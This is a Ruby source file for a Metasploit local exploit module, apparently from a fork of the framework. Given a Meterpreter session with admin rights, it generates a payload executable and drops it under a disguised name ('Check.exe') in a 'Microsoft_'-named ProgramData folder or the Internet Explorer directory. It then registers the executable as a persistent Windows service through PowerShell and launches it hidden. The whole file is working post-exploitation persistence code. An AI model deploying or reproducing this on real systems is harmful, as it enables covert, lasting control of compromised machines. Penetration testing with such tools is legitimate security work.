##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'metasploit/framework/compiler/windows'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
                      'Name'           => 'Windows Persistent Service Installer Simple API',
                      'Description'    => %q{
        This Module will generate and upload an executable to a remote host, next will make it a persistent service.
        It will create a new service which will start the payload whenever the service is running. Admin or system
        privilege is required.
      },
                      'License'        => MSF_LICENSE,
                      'Author'         => ['Green-m <greenm.xxoo[at]gmail.com>'],
                      'Platform'       => ['windows'],
                      'Arch'           => [ARCH_X86, ARCH_X64],
                      'Targets'        => [['Windows', {}]],
                      'SessionTypes'   => ['meterpreter'],
                      'DefaultTarget'  => 0,
                      'References'     => [
                              ['URL', 'https://github.com/rapid7/metasploit-framework/blob/master/external/source/metsvc/src/metsvc.cpp']
                      ],
                      'DisclosureDate' => "Jul 10 2019"
          ))

    register_options(
            [
                    OptInt.new('TIMEOUT', [false, 'Number of seconds timeout for script', 10]),
            ])

  end

  # Run Method for when run command is issued
  #-------------------------------------------------------------------------------
  def exploit
    unless is_system? || is_admin?
      pub_json_result(false,
                      "Insufficient privileges to create service",
                      nil,
                      self.uuid)
      return
    end

    vprint_status("Running module against #{sysinfo['Computer']}")

    @storedir = create_store_rand_dir()
    if @storedir == nil
      pub_json_result(false,
                      'Create rand dir failed',
                      nil,
                      self.uuid)
      return
    end

    # Set variables
    exe         = generate_payload_exe
    victim_path = write_exe_to_target(exe, "Check.exe", @storedir)

    install_service(victim_path)
  end

  def create_payload
    p = payload.encoded
    Msf::Simple::Buffer.transform(p, 'hex', 'buf')
  end

  # Function for writing executable to target host
  # Code from post/windows/manage/persistence_exe
  #
  def write_exe_to_target(rexe, rexename, rexepath)
    # check if we have write permission
    if rexepath
      begin
        temprexe = rexepath + "\\" + rexename
        write_file_to_target(temprexe, rexe)
      rescue Rex::Post::Meterpreter::RequestError
        vprint_warning("Insufficient privileges to write in #{rexepath}, writing to %APPDATA%")
        temprexe = session.sys.config.getenv('ProgramFiles') + "\\Internet Explorer\\" + rexename
        write_file_to_target(temprexe, rexe)
      end
    else
      temprexe = session.sys.config.getenv('ProgramFiles') + "\\Internet Explorer\\" + rexename
      write_file_to_target(temprexe, rexe)
    end

    vprint_good("Meterpreter service exe written to #{temprexe}")

    temprexe
  end

  def write_file_to_target(temprexe, rexe)
    fd = session.fs.file.new(temprexe, "wb")
    fd.write(rexe)
    fd.close
  end

  # Function to install payload as a service
  #-------------------------------------------------------------------------------
  def install_service(path)

    session.load_powershell
    if session.ext.aliases.has_key?('powershell')
      ps_ext = session.ext.aliases['powershell']
      opts   = { file: File.join(Msf::Config.install_root, "scripts", "ps", "Invoke-Service-persistence.ps1") }
      begin
        loadResult = ps_ext.import_file(opts, datastore['TIMEOUT'])
      rescue ::Timeout::Error, Rex::TimeoutError
        pub_json_result(false,
                        'run script timeout,please set timeout bigger',
                        nil,
                        self.uuid)
        return
      end
      code = { code: "Invoke-Service-persistence -exePath #{path}" }
      begin
        psresult = ps_ext.execute_string(code, datastore['TIMEOUT'])
      rescue ::Timeout::Error, Rex::TimeoutError
        pub_json_result(false,
                        'run script timeout,please set timeout bigger',
                        nil,
                        self.uuid)
        return
      end
      # run @victim_path for test
      proc = client.sys.process.execute(path, nil, {
              'Hidden'      => true,
              'Channelized' => false,
              'Interactive' => false,
              'Suspended'   => false,
      })
      pub_json_result(true,
                      nil,
                      { psresult: psresult, victim_path: path },
                      self.uuid)
      return

    else
      pub_json_result(false,
                      'powershell extensions load failed',
                      nil,
                      self.uuid)
      return
    end
  end

  def create_store_rand_dir()
    dirname     = Rex::Text.rand_text_alpha(6)
    fulldirname = session.sys.config.getenv('ProgramData') + "\\" + "Microsoft_#{dirname}"
    session.fs.dir.mkdir(fulldirname)
    if session.fs.file.exist? fulldirname
      vprint_good("create storedir : #{fulldirname}")
      return fulldirname
    else
      vprint_error("create storedir failed : #{fulldirname}")
      return nil
    end
  end
end
